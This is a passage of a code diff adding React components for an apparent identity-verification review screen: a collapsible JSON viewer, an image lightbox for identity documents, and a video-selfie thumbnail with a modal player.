+        {open ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
+      </button>
+      {open && (
+        <pre className="px-4 pb-4 text-[10px] text-emerald-400 font-mono leading-relaxed overflow-x-auto max-h-96 whitespace-pre-wrap break-all">
+          {JSON.stringify(data, null, 2)}
+        </pre>
+      )}
+    </div>
+  );
+}
+
 // ─── DocImage — identity document thumbnail + lightbox ────────────────────────
 
 function DocImage({ label, icon, src }: { label: string; icon: React.ReactNode; src: string | null }) {
@@ -760,6 +951,72 @@ function DocImage({ label, icon, src }: { label: string; icon: React.ReactNode; 
         >
           <div className="relative max-w-3xl max-h-[90vh]" onClick={e => e.stopPropagation()}>
             <img src={src} alt={label} className="max-w-full max-h-[80vh] rounded-xl shadow-2xl object-contain" />
+            <div className="mt-3 text-center text-white text-sm font-medium">{label}</div>
+            <button
+              onClick={() => setOpen(false)}
+              className="absolute -top-3 -right-3 w-8 h-8 bg-white rounded-full flex items-center justify-center text-slate-800 font-bold shadow-lg hover:bg-gray-100"
+            >
+              ✕
+            </button>
+          </div>
+        </div>
+      )}
+    </>
+  );
+}
+
+// ─── DocVideo — video selfie thumbnail + player ──────────────────────────────
+
+function DocVideo({ label, icon, src }: { label: string; icon: React.ReactNode; src: string | null }) {
+  const [open, setOpen] = useState(false);
+
+  if (!src) {
+    return (
+      <div className="flex flex-col items-center gap-1.5 p-3 rounded-xl border-2 border-dashed border-slate-200 bg-white min-h-[100px] justify-center">
+        <div className="text-slate-300">{icon}</div>
+        <span className="text-[10px] text-slate-400 text-center leading-tight">{label}</span>
+        <span className="text-[9px] text-slate-300 uppercase tracking-wider">Not provided</span>
+      </div>
+    );
+  }
+
+  return (
+    <>
+      <button
+        type="button"
+        onClick={() => setOpen(true)}
+        className="group relative flex flex-col rounded-xl border-2 border-slate-300 bg-white overflow-hidden hover:border-primary hover:shadow-md transition-all"
+      >
+        <div className="relative bg-slate-900 flex items-center justify-center aspect-video h-24">
+          <Video className="w-8 h-8 text-white opacity-40 group-hover:opacity-100 transition-opacity" />
+          <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-all flex items-center justify-center">
+            <Play className="w-6 h-6 text-white opacity-0 group-hover:opacity-100 transition-opacity" />
+          </div>
+          <div className="absolute top-1 left-1 bg-red-600 text-[8px] font-black text-white px-1.5 py-0.5 rounded-full uppercase tracking-tighter">
+            Video
+          </div>
+        </div>
+        <div className="px-2 py-1.5 flex items-center gap-1">
+          <span className="text-primary w-3 h-3 shrink-0">{icon}</span>
+          <span className="text-[10px] text-slate-600 font-medium leading-tight truncate">{label}</span>
+        </div>
+        <div className="absolute top-1.5 right-1.5 bg-emerald-500 rounded-full p-0.5">
+          <CheckCircle2 className="w-3 h-3 text-white" />
+        </div>
+      </button>
+
+      {open && (
+        <div
+          className="fixed inset-0 z-[9999] bg-black/80 flex items-center justify-center p-4"
+          onClick={() => setOpen(false)}
+        >
+          <div className="relative w-full max-w-4xl" onClick={e => e.stopPropagation()}>
+            <video 
+              src={src} 
+              controls 
+              autoPlay 
+              className="w-full h-auto rounded-xl shadow-2xl bg-black"
+            />
             <div className="mt-3 text-center text-white text-sm font-medium">{label}</div>
             <button
               onClick={() => setOpen(false)}
